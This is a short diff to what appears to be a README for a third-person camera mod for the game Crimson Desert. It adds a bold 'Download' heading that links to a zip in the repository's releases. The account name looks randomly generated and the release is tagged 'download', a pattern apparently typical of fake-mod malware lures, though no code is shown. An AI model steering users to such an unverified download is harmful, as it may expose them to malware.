@@ -3,7 +3,7 @@
 
 <img width="1652" height="879" alt="{26858B1E-AE55-46FE-A13D-F8975EAF0AB9}" src="https://github.com/user-attachments/assets/bf2f38fe-2fc8-49d5-b384-ccdb83c5d6b0" />
 
-
+# [Download](https://github.com/luke-petrovdev2092i5/Crimson-Desert-Proper-3rd-Person-Camera-Mod/releases/download/download/Proper.3rd.Person.Camera.zip)
 
 ---
 
